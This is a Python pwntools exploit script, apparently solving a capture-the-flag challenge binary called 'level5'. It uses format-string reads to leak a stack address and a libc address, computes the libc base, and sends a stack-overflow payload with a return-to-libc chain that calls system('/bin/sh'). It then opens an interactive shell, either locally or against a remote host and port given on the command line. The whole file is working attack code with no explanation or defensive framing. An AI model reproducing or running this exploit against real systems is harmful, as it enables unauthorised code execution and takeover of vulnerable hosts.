#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True
#gdb_bool = False

def exploit(r):

    r.recvuntil(": ")
    r.sendline("3")
    r.recv(0xb)
    formatstr = "%71$p"
    r.sendline(formatstr)
    r.recvline()
    gg = r.recvline().strip()
    print("BUF: ",gg)
    r.recvuntil(": ")

    r.sendline("3")
    formatstr = "%77$p"
    r.sendline(formatstr)
    r.recvline()
    libcc = r.recvline().strip()
    print("libccc: ",libcc)
    r.recvuntil(": ")


    system_off = 0x45390
    main_off = 0x020830 
    binsh = 0x18CD57
    base = eval(libcc) - main_off
    r.sendline("1")
    r.recv(0x2d)
    buf = ""
    buf += "a"*cyclic_find("daaaaaaa",n=8)
    buf += p64(eval(gg))
    buf += "C"*8


    #buf += p64(1)
    #buf += p64(1)
    #buf += p64(1)
    print("Base: ", hex(base))
    print("System: ",hex(base+system_off))
    buf += p64(base+system_off)
    buf += p64(1)
    buf += p64(base+binsh)
    buf += "A"*(0x42-len(buf))
    r.sendline(buf)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./level5"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name,env={"LD_PRELOAD" : "./libc.so.6"})
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x4009F1",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

